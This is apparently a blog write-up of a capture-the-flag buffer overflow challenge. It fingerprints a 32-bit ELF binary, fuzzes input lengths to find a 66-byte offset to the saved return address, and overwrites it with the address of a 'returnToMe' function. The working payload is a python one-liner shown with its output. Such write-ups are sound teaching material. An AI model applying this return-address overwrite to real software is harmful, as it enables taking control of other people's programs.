buf1 - Another Buffer Overflow Challenge
========================================
date: 24/Feb/2014
summary: This is another buffer overflow challenge I found online. I posted a writeup on a similar challenge buf0 earlier and one for this challenge was long due. Finally today I got some time to document the solution.
tags: buffer overflow, writeups, reversing

The binary can be obtained from here: [buf1](/static/files/buf1.bin). Let's see
what `file` command has to tell us about this challenge file:

```bash
$ file buf1.bin
buf1.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x746bc251bceb3d50b635362140ec851bf6f85317, not stripped
```

So this binary, like it's [counterpart](/2014/buf0-challenge.html), is
also an x86 ELF with symbols included. Let's run `strings` as well over
this file:

```bash
$ strings buf1.bin
/lib/ld-linux.so.2
ktP=
__gmon_start__
libc.so.6
_IO_stdin_used
gets
puts
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
W00T!
;*2$"
```

There's the `gets` syscall and the `W00T!` string which confirm that
this indeed is very similar to the previous challenge. Before we execute
this file, let's do some static analysis on it using IDA:

![image](/static/files/ida-start.png)

Apart from the standard libc defintions and `main`, I see an interesting
function called `returnToMe` at location 0x08048404. Let's follow this
function and see what is it doing:

![image](/static/files/ida-returntome.png)

Let's figure out the size of the buffer to know how many bytes would be
needed to reach saved EIP:

```bash
$ python -c 'print "A"*40' | ./buf1.bin
$ python -c 'print "A"*50' | ./buf1.bin
$ python -c 'print "A"*60' | ./buf1.bin
$ python -c 'print "A"*70' | ./buf1.bin
Segmentation fault (core dumped)
$
$ python -c 'print "A"*65' | ./buf1.bin
$ python -c 'print "A"*66' | ./buf1.bin
Illegal instruction (core dumped)
$
$ python -c 'print "A"*67' | ./buf1.bin
Segmentation fault (core dumped)
```

So, the binary accepts max 66B before `gets` overwrites saved EIP. Now
we can inject the buffer with dummy input followed by the address of
`returnToMe` function:

```bash
$ python -c 'print "A"*66 + "\x04\x84\x04\x08"' | ./buf1.bin
W00T!
Segmentation fault (core dumped)
```

Done. But this time the program didn't exit cleanly. However, the
challenge was to get the `returnToMe` function called and it was done
successfully. But it's not always about completing challenges. Let's
take it as a learning opportunity and understand why, being so similar,
both challenges exited in different manner. To understand this and other
such minute intricacies of buffer overflows read my previous posts
starting with: [Gera's Warming Up on Stack #1 -
Solutions](/2012/geras-wuos-stack1-solutions.html).
